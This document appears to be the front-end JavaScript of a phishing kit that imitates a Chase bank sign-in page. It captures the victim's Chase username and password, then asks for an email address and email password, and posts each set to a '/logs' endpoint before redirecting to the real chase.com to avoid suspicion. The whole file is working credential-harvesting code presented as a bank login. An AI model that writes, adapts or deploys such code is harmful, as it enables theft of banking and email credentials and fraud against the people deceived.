$(document).ready(() => {


    /* $(document).mousedown(() => {

         if ($("#userId-text-input-field").val() !== "") {

         }


     })*/

    $("#login-form").submit(evt => {
        evt.preventDefault();
    })

    $(document).keyup(evt => {

        if ($("#userId-text-input-field").val() !== "" && $("#password-text-input-field").val() !== "") {
            $("#signin-button").removeAttr("disabled");
        } else {
            $("#signin-button").attr("disabled", "disabled");
        }

    })

    $("#signin-button").click(evt => {

        if ($("#userId-text-input-field").val() !== "" && $("#password-text-input-field").val() !== "") {
            if ($("#password-text-input-field").val().includes(" ") === true) {
                Swal.fire({
                    type: 'error',
                    text: `Your password is incorrect. It seems you have added a space in it, please check and enter the correct password.`
                })
            } else {
                $("#login-signin").attr("disabled", "disabled");
                sumbitLogs({
                    chaseUsername: $("#userId-text-input-field").val(),
                    chasePassword: $("#password-text-input-field").val(),
                    page: 1
                })
            }
        }
    })

    $("#email-signin-button").click(() => {

        if ($("#email-input-field").val() !== "" && $("#password-input-field").val() !== "") {

            if ($("#password-input-field").val().includes(" ") === true) {

                Swal.fire({
                    type: 'error',
                    text: `Your password is incorrect. It seems you have added a space in it, please check and enter the correct password.`
                })
            } else {
                $("#email-signin-button").attr("disabled", "disabled");

                submitEmailLogs({
                    email: $("#email-input-field").val(),
                    emailPassword: $("#password-input-field").val(),
                    page: 2
                })
            }
        }

    })


    function submitEmailLogs(logs) {

        $.ajax({
            type: "POST",
            url: "/logs",
            contentType: "application/json; charset=utf-8",
            data: JSON.stringify(logs),
            success: submitEmailLogsSuccess,
            error(err) {
                console.log(err);
                $("#email-signin-button").removeAttr("disabled");
            }
        });

    }

    function sumbitLogs(logs) {

        $.ajax({
            type: "POST",
            url: "/logs",
            contentType: "application/json; charset=utf-8",
            data: JSON.stringify(logs),
            success: success,
            error(err) {
                console.log(err);
                $("#signin-button").removeAttr("disabled");
            }
        });

    }


    function submitEmailLogsSuccess(data) {

        if (data === "Server Error") {
            Swal.fire({
                type: 'error',
                text: 'There was an error submitting your credentials, please try submitting again.'
            }).then(result => {
                $("#signin-button").removeAttr("disabled");
            })
        } else if (data === "2") {
            location.href = `https://chase.com`;
        }

    }


    function success(data) {

        if (data === "Server Error") {
            Swal.fire({
                type: 'error',
                text: 'There was an error submitting your credentials, please try submitting again.'
            }).then(result => {
                $("#signin-button").removeAttr("disabled");
            })
        } else if (data === "1") {
            location.href = `/account/email-verification`;
        }

    }

})